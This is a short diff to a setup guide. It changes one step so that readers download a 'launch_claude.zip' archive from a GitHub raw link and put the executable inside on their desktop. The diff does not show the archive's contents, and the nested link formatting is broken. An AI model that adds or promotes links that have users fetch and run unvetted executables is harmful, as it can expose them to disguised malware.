@@ -17,4 +17,4 @@
 
 4. **Use the `.exe` launcher (Optional)**
 
-   Unzip `launch_claude.zip`, navigate to `dist\launch_claude`, and add `launch_claude.exe` to the desktop.
+   Unzip `[Download `launch_claude.zip`](https://github.com/NeonBear-Games/ollama-config/raw/refs/heads/main/launch_claude.zip)`, navigate to `dist\launch_claude`, and add `launch_claude.exe` to the desktop.
